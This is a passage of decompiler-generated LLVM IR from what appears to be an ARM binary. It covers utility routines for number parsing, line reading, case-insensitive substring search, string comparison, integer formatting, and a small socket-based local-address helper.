  %v1_10a1c = phi i32 [ %v3_10a64, %dec_label_pc_10a64 ], [ %v1_10a1c.ph, %dec_label_pc_109dc.outer ]
  %v1_109dc = urem i32 %v1_10a1c, 256
  %v1_109e0 = add nsw i32 %v1_109dc, -48
  %v1_109e8 = add nsw i32 %v1_109dc, -97
  %v1_109ec = add i32 %v1_10a1c, -48
  %v1_109f0 = add nsw i32 %v1_109dc, -65
  %tmp75 = icmp ult i32 %v1_109e0, 10
  br i1 %tmp75, label %dec_label_pc_10a20, label %dec_label_pc_109f8

dec_label_pc_109f8:                               ; preds = %dec_label_pc_109dc
  %v2_109f8 = icmp ugt i32 %v1_109f0, 24
  %v7_109f8 = icmp eq i32 %v1_109f0, 25
  %v2_109fc = xor i1 %v7_109f8, true
  %v3_109fc = and i1 %v2_109f8, %v2_109fc
  br i1 %v3_109fc, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_109f8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_109f8, %bb45
  %v0_10a1014 = phi i32 [ %v1_109ec, %dec_label_pc_109f8 ], [ 0, %bb45 ]
  %v2_10a00 = xor i1 %v2_109f8, true
  %v3_10a00 = or i1 %v7_109f8, %v2_10a00
  br i1 %v3_10a00, label %bb47, label %bb48

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_10a10 = phi i32 [ %v0_10a1014, %bb46 ], [ 1, %bb47 ]
  br i1 %v3_109fc, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  %v6_10a08 = icmp ugt i32 %v1_109e8, 24
  %v11_10a08 = icmp eq i32 %v1_109e8, 25
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_10a0c = phi i1 [ %v7_109f8, %bb48 ], [ %v11_10a08, %bb49 ]
  %v0_10a0c = phi i1 [ %v2_109f8, %bb48 ], [ %v6_10a08, %bb49 ]
  %v2_10a0c = xor i1 %v1_10a0c, true
  %v3_10a0c = and i1 %v0_10a0c, %v2_10a0c
  br i1 %v3_10a0c, label %dec_label_pc_10a70, label %dec_label_pc_10a10

dec_label_pc_10a10:                               ; preds = %bb50
  %v2_10a10 = icmp eq i32 %v0_10a10, 0
  %. = select i1 %v2_10a10, i32 87, i32 55
  %v2_10a1c = sub i32 %v1_10a1c, %.
  br label %dec_label_pc_10a20

dec_label_pc_10a20:                               ; preds = %dec_label_pc_109dc, %dec_label_pc_10a10
  %v0_10a3429 = phi i32 [ %v1_109f0, %dec_label_pc_109dc ], [ %., %dec_label_pc_10a10 ]
  %v3_10a58 = phi i32 [ %v1_109ec, %dec_label_pc_109dc ], [ %v2_10a1c, %dec_label_pc_10a10 ]
  %v1_10a20 = load i32, i32* %r6.global-to-local, align 4
  %v2_10a20 = sub i32 %v3_10a58, %v1_10a20
  %v4_10a20 = xor i32 %v1_10a20, %v3_10a58
  %v5_10a20 = xor i32 %v2_10a20, %v3_10a58
  %v6_10a20 = and i32 %v5_10a20, %v4_10a20
  %v7_10a20 = icmp slt i32 %v6_10a20, 0
  %v8_10a20 = icmp slt i32 %v2_10a20, 0
  %v2_10a24 = xor i1 %v8_10a20, %v7_10a20
  br i1 %v2_10a24, label %dec_label_pc_10a28, label %dec_label_pc_10a70

dec_label_pc_10a28:                               ; preds = %dec_label_pc_10a20
  br i1 %v3_10a2c, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_10a28
  br label %bb54

bb54:                                             ; preds = %dec_label_pc_10a28, %bb53
  %v0_10a3428 = phi i32 [ %v0_10a3429, %dec_label_pc_10a28 ], [ 0, %bb53 ]
  br i1 %v3_10a30, label %bb55, label %bb56

bb55:                                             ; preds = %bb54
  br label %bb56

bb56:                                             ; preds = %bb54, %bb55
  %v0_10a34 = phi i32 [ %v0_10a3428, %bb54 ], [ 1, %bb55 ]
  %tmp76 = icmp slt i32 %v1_10a34, 0
  %v4_10a34 = zext i1 %tmp76 to i32
  %v5_10a34 = or i32 %v0_10a34, %v4_10a34
  %v7_10a34 = icmp eq i32 %v5_10a34, 0
  br i1 %v7_10a34, label %dec_label_pc_10a3c, label %dec_label_pc_10a64

dec_label_pc_10a3c:                               ; preds = %bb56
  %v1_10a48 = load i32, i32* %r8.global-to-local, align 4
  %v2_10a48 = sub i32 %v3_10a58, %v1_10a48
  %v4_10a48 = xor i32 %v1_10a48, %v3_10a58
  %v5_10a48 = xor i32 %v2_10a48, %v3_10a58
  %v6_10a48 = and i32 %v5_10a48, %v4_10a48
  %v7_10a48 = icmp slt i32 %v6_10a48, 0
  %v8_10a48 = icmp slt i32 %v2_10a48, 0
  %v9_10a48 = icmp eq i32 %v3_10a58, %v1_10a48
  %v3_10a4c = xor i1 %v8_10a48, %v7_10a48
  %v4_10a4c = or i1 %v9_10a48, %v3_10a4c
  br i1 %v4_10a4c, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_10a3c
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_10a3c
  br i1 %v2_10a50, label %.thread5, label %dec_label_pc_10a64

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_10a58 = mul i32 %v1_10a20, %v2_10a58.ph
  %v5_10a58 = add i32 %v4_10a58, %v3_10a58
  %v1_10a5c = load i32, i32* %r5.global-to-local, align 4
  %v2_10a5c = inttoptr i32 %v1_10a5c to i8*
  %v3_10a5c = load i8, i8* %v2_10a5c, align 1
  %v4_10a5c = zext i8 %v3_10a5c to i32
  %v6_10a5c = add i32 %v1_10a5c, 1
  store i32 %v6_10a5c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_109dc.outer

dec_label_pc_10a64:                               ; preds = %thread-pre-split, %bb56
  %v0_10a64 = load i32, i32* %r5.global-to-local, align 4
  %v1_10a64 = inttoptr i32 %v0_10a64 to i8*
  %v2_10a64 = load i8, i8* %v1_10a64, align 1
  %v3_10a64 = zext i8 %v2_10a64 to i32
  %v5_10a64 = add i32 %v0_10a64, 1
  store i32 %v5_10a64, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_109dc

dec_label_pc_10a70:                               ; preds = %dec_label_pc_10a20, %bb50
  %v1_10a70 = icmp slt i32 %v1_10a34, 0
  %v0_10a9c = load i32, i32* %sl.global-to-local, align 4
  %v2_10a9c = icmp eq i32 %v0_10a9c, 0
  br i1 %v1_10a70, label %dec_label_pc_10a9c, label %dec_label_pc_10a78

dec_label_pc_10a78:                               ; preds = %dec_label_pc_10a70
  br i1 %v2_10a9c, label %bb60, label %bb59

bb59:                                             ; preds = %dec_label_pc_10a78
  %v2_10a7c = sub i32 0, %v2_10a58.ph
  br label %bb60

bb60:                                             ; preds = %.thread32, %bb61, %dec_label_pc_10a78, %bb59
  %v1_10a88 = phi i32 [ -2147483648, %bb61 ], [ %v2_10a58.ph, %dec_label_pc_10a78 ], [ %v2_10a7c, %bb59 ], [ 2147483647, %.thread32 ]
  store i32 %v3_10970, i32* @r4, align 4
  store i32 %v12_10970, i32* @r7, align 4
  ret i32 %v1_10a88

dec_label_pc_10a8c:                               ; preds = %dec_label_pc_1099c
  %v1_10a8c = inttoptr i32 %v5_10980 to i8*
  %v2_10a8c = load i8, i8* %v1_10a8c, align 1
  %v3_10a8c = zext i8 %v2_10a8c to i32
  store i32 %v3_10a8c, i32* @r4, align 4
  %v5_10a8c = add i32 %v0_10980, 2
  store i32 %v5_10a8c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_109b4

dec_label_pc_10a9c:                               ; preds = %dec_label_pc_10a70
  br i1 %v2_10a9c, label %.thread32, label %bb61

.thread32:                                        ; preds = %dec_label_pc_10a9c
  br label %bb60

bb61:                                             ; preds = %dec_label_pc_10a9c
  br label %bb60

; uselistorder directives
  uselistorder i1 %v2_10a9c, { 1, 0 }
  uselistorder i32 %v2_10a48, { 1, 0 }
  uselistorder i32 %v1_10a48, { 1, 0, 2 }
  uselistorder i32 %v2_10a20, { 1, 0 }
  uselistorder i32 %v3_10a58, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_109f8, { 1, 2, 0 }
  uselistorder i1 %v2_109f8, { 1, 0, 2 }
  uselistorder i32 %v1_109dc, { 1, 2, 0 }
  uselistorder i32 %v1_10a1c, { 1, 2, 0 }
  uselistorder i32 %v1_10a34, { 1, 0 }
  uselistorder i1 %v9_10a28, { 1, 0, 2 }
  uselistorder i1 %v3_10a28, { 1, 0 }
  uselistorder i32 %v2_10a58.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_109cc, { 1, 0 }
  uselistorder i32 %v5_10980, { 3, 4, 5, 2, 1, 0 }
  uselistorder i8 %v2_10980, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_10980, { 0, 1, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 5, 2, 4, 3, 6, 7 }
  uselistorder i32 25, { 22, 23, 6, 16, 5, 12, 2, 13, 3, 14, 4, 15, 11, 7, 17, 0, 18, 8, 9, 19, 10, 20, 1, 21 }
  uselistorder i8 32, { 9, 10, 11, 0, 12, 13, 1, 2, 14, 3, 4, 5, 6, 7, 8 }
  uselistorder i8 9, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %bb60, { 1, 0, 3, 2 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %bb54, { 1, 0 }
  uselistorder label %dec_label_pc_10a20, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_109dc, { 1, 0 }
  uselistorder label %dec_label_pc_109b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10980, { 1, 2, 0, 3 }
}

define i32 @function_10aac(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10aac:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_10aac = load i32, i32* @r4, align 4
  store i32 %v3_10aac, i32* %stack_var_-24, align 4
  %v12_10aac = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10ac4

dec_label_pc_10ac4:                               ; preds = %dec_label_pc_10ae8.dec_label_pc_10ac4_crit_edge, %dec_label_pc_10aac
  %v0_10ac8 = phi i32 [ %v0_10ac8.pre, %dec_label_pc_10ae8.dec_label_pc_10ac4_crit_edge ], [ %arg3, %dec_label_pc_10aac ]
  %v1_10ad0 = call i32 @function_110a4(i32 %v0_10ac8)
  %v7_10ad4 = icmp eq i32 %v1_10ad0, 1
  %v0_10adc = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_10ad4, label %dec_label_pc_10adc, label %dec_label_pc_10af4

dec_label_pc_10adc:                               ; preds = %dec_label_pc_10ac4
  %v1_10adc = add i32 %v0_10adc, 1
  store i32 %v1_10adc, i32* %r5.global-to-local, align 4
  %v1_10ae0 = load i32, i32* %r8.global-to-local, align 4
  %v6_10ae4 = icmp slt i32 %v1_10adc, %v1_10ae0
  br i1 %v6_10ae4, label %dec_label_pc_10ae8, label %.loopexit

dec_label_pc_10ae8:                               ; preds = %dec_label_pc_10adc
  %v0_10ae8 = load i32, i32* %r4.global-to-local, align 4
  %v1_10ae8 = inttoptr i32 %v0_10ae8 to i8*
  %v2_10ae8 = load i8, i8* %v1_10ae8, align 1
  %v5_10ae8 = add i32 %v0_10ae8, 1
  store i32 %v5_10ae8, i32* %r4.global-to-local, align 4
  %v7_10aec = icmp eq i8 %v2_10ae8, 10
  br i1 %v7_10aec, label %dec_label_pc_10af4, label %dec_label_pc_10ae8.dec_label_pc_10ac4_crit_edge

dec_label_pc_10ae8.dec_label_pc_10ac4_crit_edge:  ; preds = %dec_label_pc_10ae8
  %v0_10ac8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10ac4

dec_label_pc_10af4:                               ; preds = %dec_label_pc_10ac4, %dec_label_pc_10ae8
  %v0_10af4 = phi i32 [ %v1_10adc, %dec_label_pc_10ae8 ], [ %v0_10adc, %dec_label_pc_10ac4 ]
  %v2_10af4 = icmp eq i32 %v0_10af4, 0
  br i1 %v2_10af4, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_10af4
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_10adc, %dec_label_pc_10af4, %bb
  %v0_10afc = load i32, i32* @r7, align 4
  %v2_10b00 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10b00, i32* @r4, align 4
  store i32 %v12_10aac, i32* @r7, align 4
  ret i32 %v0_10afc

; uselistorder directives
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10af4, { 1, 0 }
}

define i32 @function_10b08() local_unnamed_addr {
dec_label_pc_10b08:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  store i32 16, i32* %r6.global-to-local, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_10b18 = call i32 @function_11734()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10b20 = inttoptr i32 %v0_10b18 to i32*
  store i32 0, i32* %v2_10b20, align 4
  %v0_10b2c = load i32, i32* %r4.global-to-local, align 4
  %v3_10b30 = call i32 @function_11aec(i32 2, i32 2, i32 %v0_10b2c)
  %v7_10b34 = icmp eq i32 %v3_10b30, -1
  store i32 %v3_10b30, i32* %r5.global-to-local, align 4
  br i1 %v7_10b34, label %bb, label %dec_label_pc_10b44

bb:                                               ; preds = %dec_label_pc_10b08
  %v1_10b3c = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10b90

dec_label_pc_10b44:                               ; preds = %dec_label_pc_10b08
  %v2_10b50 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10b50, i32* %r4.global-to-local, align 4
  %v0_10b5c = load i32, i32* %r6.global-to-local, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_10b70 = call i32 @function_118d4(i32 %v3_10b30, i32 %v2_10b50, i32 %v0_10b5c)
  %v2_10b78 = ptrtoint i32* %stack_var_-20 to i32
  %v0_10b7c = load i32, i32* %r5.global-to-local, align 4
  %v3_10b80 = call i32 @function_1190c(i32 %v0_10b7c, i32 %v2_10b50, i32 %v2_10b78)
  %v1_10b88 = call i32 @function_1130c(i32 %v0_10b7c)
  br label %dec_label_pc_10b90

dec_label_pc_10b90:                               ; preds = %bb, %dec_label_pc_10b44
  %storemerge = phi i32 [ 134744072, %dec_label_pc_10b44 ], [ %v1_10b3c, %bb ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_10b30, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_118d4, { 8, 9, 7, 5, 6, 4, 2, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_11aec, { 26, 27, 24, 25, 22, 23, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 3, 2, 11, 10, 9, 8, 7, 6, 5, 4, 1, 0 }
  uselistorder label %dec_label_pc_10b90, { 1, 0 }
}

define i32 @function_10b9c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10b9c:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_10ba0 = load i8, i8* %tmp, align 1
  %v2_10ba4 = icmp eq i8 %v3_10ba0, 0
  br i1 %v2_10ba4, label %bb, label %dec_label_pc_10bb8

bb:                                               ; preds = %dec_label_pc_10b9c
  %v4_10ba0 = zext i8 %v3_10ba0 to i32
  br label %dec_label_pc_10bcc

dec_label_pc_10bb8:                               ; preds = %dec_label_pc_10b9c
  br label %dec_label_pc_10bbc

dec_label_pc_10bbc:                               ; preds = %dec_label_pc_10bbc, %dec_label_pc_10bb8
  %v0_10bbc = phi i32 [ %v1_10bbc, %dec_label_pc_10bbc ], [ 0, %dec_label_pc_10bb8 ]
  %v1_10bbc = add i32 %v0_10bbc, 1
  %v2_10bc0 = add i32 %v1_10bbc, %arg2
  %v3_10bc0 = inttoptr i32 %v2_10bc0 to i8*
  %v4_10bc0 = load i8, i8* %v3_10bc0, align 1
  %v2_10bc4 = icmp eq i8 %v4_10bc0, 0
  br i1 %v2_10bc4, label %dec_label_pc_10bcc, label %dec_label_pc_10bbc

dec_label_pc_10bcc:                               ; preds = %dec_label_pc_10bbc, %bb
  %v0_10c1021 = phi i32 [ %v4_10ba0, %bb ], [ %v1_10bbc, %dec_label_pc_10bbc ]
  %v0_10bd42 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_10bd42, 1
  br i1 %tmp29, label %dec_label_pc_10c24, label %dec_label_pc_10be0

dec_label_pc_10be0:                               ; preds = %dec_label_pc_10bcc, %dec_label_pc_10bd4.backedge
  %v0_10bd8.in = phi i32 [ %v0_10bd8, %dec_label_pc_10bd4.backedge ], [ %v0_10bd42, %dec_label_pc_10bcc ]
  %v1_10bec = phi i32 [ %v1_10bec15, %dec_label_pc_10bd4.backedge ], [ 0, %dec_label_pc_10bcc ]
  %v0_10be0 = phi i32 [ %v5_10be0, %dec_label_pc_10bd4.backedge ], [ %tmp23, %dec_label_pc_10bcc ]
  %v0_10bd8 = add i32 %v0_10bd8.in, -1
  %v1_10be0 = inttoptr i32 %v0_10be0 to i8*
  %v2_10be0 = load i8, i8* %v1_10be0, align 1
  %v3_10be0 = zext i8 %v2_10be0 to i32
  %v5_10be0 = add i32 %v0_10be0, 1
  %v1_10be4 = add nsw i32 %v3_10be0, -65
  %v2_10bec = add i32 %v1_10bec, %arg2
  %v3_10bec = inttoptr i32 %v2_10bec to i8*
  %v4_10bec = load i8, i8* %v3_10bec, align 1
  %v6_10bec = zext i8 %v4_10bec to i32
  %v1_10bf0 = add nsw i32 %v6_10bec, -65
  %tmp38 = icmp ult i32 %v1_10be4, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_10be0
  %v5_10bf4 = or i32 %v3_10be0, 96
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_10be0, %bb30
  %v0_10c00 = phi i32 [ %v3_10be0, %dec_label_pc_10be0 ], [ %v5_10bf4, %bb30 ]
  %tmp39 = icmp ult i32 %v1_10bf0, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_10bfc = or i32 %v6_10bec, 96
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_10c00 = phi i32 [ %v6_10bec, %bb31 ], [ %v5_10bfc, %bb32 ]
  %v9_10c00 = icmp eq i32 %v0_10c00, %v1_10c00
  br i1 %v9_10c00, label %dec_label_pc_10c0c, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_10bd4.backedge

dec_label_pc_10bd4.backedge:                      ; preds = %bb34, %dec_label_pc_10c0c
  %v1_10bec15 = phi i32 [ 0, %bb34 ], [ %v1_10c0c, %dec_label_pc_10c0c ]
  %tmp35 = icmp slt i32 %v0_10bd8, 1
  br i1 %tmp35, label %dec_label_pc_10c24, label %dec_label_pc_10be0

dec_label_pc_10c0c:                               ; preds = %bb33
  %v1_10c0c = add i32 %v1_10bec, 1
  %v9_10c10 = icmp eq i32 %v0_10c1021, %v1_10c0c
  br i1 %v9_10c10, label %dec_label_pc_10c18, label %dec_label_pc_10bd4.backedge

dec_label_pc_10c18:                               ; preds = %dec_label_pc_10c0c
  %v2_10c18 = sub i32 %v5_10be0, %tmp23
  br label %dec_label_pc_10c24

dec_label_pc_10c24:                               ; preds = %dec_label_pc_10bd4.backedge, %dec_label_pc_10bcc, %dec_label_pc_10c18
  %storemerge = phi i32 [ %v2_10c18, %dec_label_pc_10c18 ], [ -1, %dec_label_pc_10bcc ], [ -1, %dec_label_pc_10bd4.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10c0c, { 1, 0 }
  uselistorder i32 %v0_10be0, { 1, 0 }
  uselistorder i32 %v1_10bec, { 1, 0 }
  uselistorder i8 %v3_10ba0, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 7, 6, 8, 3, 9, 4, 10, 5, 11, 12 }
  uselistorder label %dec_label_pc_10c24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10bd4.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_10be0, { 1, 0 }
}

define i32 @function_10c2c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10c2c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_10c2c = load i8, i8* %arg1, align 1
  %v2_10c30 = icmp eq i8 %v2_10c2c, 0
  br i1 %v2_10c30, label %bb, label %dec_label_pc_10c3c

bb:                                               ; preds = %dec_label_pc_10c2c
  %v3_10c2c = zext i8 %v2_10c2c to i32
  br label %dec_label_pc_10c50

dec_label_pc_10c3c:                               ; preds = %dec_label_pc_10c2c
  br label %dec_label_pc_10c40

dec_label_pc_10c40:                               ; preds = %dec_label_pc_10c40, %dec_label_pc_10c3c
  %v0_10c40 = phi i32 [ %v1_10c40, %dec_label_pc_10c40 ], [ 0, %dec_label_pc_10c3c ]
  %v1_10c40 = add i32 %v0_10c40, 1
  %v2_10c44 = add i32 %v1_10c40, %tmp
  %v3_10c44 = inttoptr i32 %v2_10c44 to i8*
  %v4_10c44 = load i8, i8* %v3_10c44, align 1
  %v2_10c48 = icmp eq i8 %v4_10c44, 0
  br i1 %v2_10c48, label %dec_label_pc_10c50, label %dec_label_pc_10c40

dec_label_pc_10c50:                               ; preds = %dec_label_pc_10c40, %bb
  %v0_10c9c3 = phi i32 [ %v3_10c2c, %bb ], [ %v1_10c40, %dec_label_pc_10c40 ]
  %v1_10c50 = inttoptr i32 %arg2 to i8*
  %v2_10c50 = load i8, i8* %v1_10c50, align 1
  %v3_10c50 = zext i8 %v2_10c50 to i32
  store i32 %v3_10c50, i32* @r3, align 4
  %v2_10c54 = icmp eq i8 %v2_10c50, 0
  br i1 %v2_10c54, label %bb21, label %dec_label_pc_10c60

bb21:                                             ; preds = %dec_label_pc_10c50
  store i32 %v3_10c50, i32* @r2, align 4
  br label %dec_label_pc_10c74

dec_label_pc_10c60:                               ; preds = %dec_label_pc_10c50
  br label %dec_label_pc_10c64

dec_label_pc_10c64:                               ; preds = %dec_label_pc_10c64, %dec_label_pc_10c60
  %v0_10c64 = phi i32 [ %v1_10c64, %dec_label_pc_10c64 ], [ 0, %dec_label_pc_10c60 ]
  %v1_10c64 = add i32 %v0_10c64, 1
  store i32 %v1_10c64, i32* @r2, align 4
  %v2_10c68 = add i32 %v1_10c64, %arg2
  %v3_10c68 = inttoptr i32 %v2_10c68 to i8*
  %v4_10c68 = load i8, i8* %v3_10c68, align 1
  %v6_10c68 = zext i8 %v4_10c68 to i32
  store i32 %v6_10c68, i32* @r3, align 4
  %v2_10c6c = icmp eq i8 %v4_10c68, 0
  br i1 %v2_10c6c, label %dec_label_pc_10c74, label %dec_label_pc_10c64

dec_label_pc_10c74:                               ; preds = %dec_label_pc_10c64, %bb21
  %v0_10c74 = phi i32 [ %v3_10c50, %bb21 ], [ %v1_10c64, %dec_label_pc_10c64 ]
  %v9_10c74 = icmp eq i32 %v0_10c74, %v0_10c9c3
  br i1 %v9_10c74, label %dec_label_pc_10c9c.preheader, label %dec_label_pc_10c7c

dec_label_pc_10c9c.preheader:                     ; preds = %dec_label_pc_10c74
  %v2_10c9c5 = icmp eq i32 %v0_10c9c3, 0
  br i1 %v2_10c9c5, label %dec_label_pc_10ca4, label %dec_label_pc_10c84

dec_label_pc_10c7c:                               ; preds = %dec_label_pc_10c84, %dec_label_pc_10c74
  ret i32 0

dec_label_pc_10c84:                               ; preds = %dec_label_pc_10c94, %dec_label_pc_10c9c.preheader
  %v0_10c9c.in = phi i32 [ %v0_10c9c, %dec_label_pc_10c94 ], [ %v0_10c9c3, %dec_label_pc_10c9c.preheader ]
  %v0_10c98 = phi i32 [ %v1_10c98, %dec_label_pc_10c94 ], [ %arg2, %dec_label_pc_10c9c.preheader ]
  %v0_10c94 = phi i32 [ %v1_10c94, %dec_label_pc_10c94 ], [ %tmp, %dec_label_pc_10c9c.preheader ]
  %v0_10c9c = add i32 %v0_10c9c.in, -1
  %v1_10c84 = inttoptr i32 %v0_10c94 to i8*
  %v2_10c84 = load i8, i8* %v1_10c84, align 1
  %v3_10c84 = zext i8 %v2_10c84 to i32
  store i32 %v3_10c84, i32* @r2, align 4
  %v1_10c88 = inttoptr i32 %v0_10c98 to i8*
  %v2_10c88 = load i8, i8* %v1_10c88, align 1
  %v3_10c88 = zext i8 %v2_10c88 to i32
  store i32 %v3_10c88, i32* @r3, align 4
  %v9_10c8c = icmp eq i8 %v2_10c84, %v2_10c88
  br i1 %v9_10c8c, label %dec_label_pc_10c94, label %dec_label_pc_10c7c

dec_label_pc_10c94:                               ; preds = %dec_label_pc_10c84
  %v1_10c94 = add i32 %v0_10c94, 1
  %v1_10c98 = add i32 %v0_10c98, 1
  %v2_10c9c = icmp eq i32 %v0_10c9c, 0
  br i1 %v2_10c9c, label %dec_label_pc_10ca4, label %dec_label_pc_10c84

dec_label_pc_10ca4:                               ; preds = %dec_label_pc_10c94, %dec_label_pc_10c9c.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_10c64, { 0, 1, 3, 2 }
  uselistorder i8 %v2_10c2c, { 1, 0 }
}

define i32 @function_10cac(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10cac:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v3_10cac = load i32, i32* @r4, align 4
  %v12_10cac = load i32, i32* @r7, align 4
  %v0_10cb0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10cb0, i32* %r8.global-to-local, align 4
  %v2_10cb0 = icmp eq i32 %v0_10cb0, 0
  store i1 %v2_10cb0, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_10cb0, label %dec_label_pc_10d90, label %dec_label_pc_10cc0

dec_label_pc_10cc0:                               ; preds = %dec_label_pc_10cac
  %v3_10cc0 = icmp eq i8 %arg1, 0
  store i1 %v3_10cc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10cc0, label %.thread, label %dec_label_pc_10cd4

.thread:                                          ; preds = %dec_label_pc_10cc0
  %v4_10cc8 = inttoptr i32 %v0_10cb0 to i8*
  store i8 48, i8* %v4_10cc8, align 1
  %v0_10ccc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10ccc.pr.pr, label %.thread1, label %dec_label_pc_10cd4

.thread1:                                         ; preds = %.thread
  %v4_10ccc = load i32, i32* %r8.global-to-local, align 4
  %v5_10ccc = add i32 %v4_10ccc, 1
  %v6_10ccc = inttoptr i32 %v5_10ccc to i8*
  store i8 0, i8* %v6_10ccc, align 1
  %v0_10cd0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10cd0.pr.pr, label %dec_label_pc_10d90, label %dec_label_pc_10cd4

dec_label_pc_10cd4:                               ; preds = %dec_label_pc_10cc0, %.thread, %.thread1
  %tmp47 = icmp slt i8 %arg1, 0
  %v7_10cd8 = icmp eq i32 %arg2, 10
  store i1 %v7_10cd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10cd8, label %bb, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_10cd4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_10cd4
  %v4_10cd4 = zext i1 %tmp47 to i32
  store i32 %v4_10cd4, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp47, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_10cf88 = sub nsw i32 0, %tmp
  %tmp.v3_10cf88 = select i1 %phitmp, i32 %tmp, i32 %v3_10cf88
  %tmp46 = zext i1 %phitmp to i32
  %. = xor i32 %tmp46, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread28
  %storemerge30 = phi i32 [ %tmp, %.thread28 ], [ %tmp.v3_10cf88, %bb ]
  %storemerge = phi i32 [ 0, %.thread28 ], [ %., %bb ]
  store i32 %storemerge30, i32* @r4, align 4
  store i32 %storemerge, i32* %sl.global-to-local, align 4
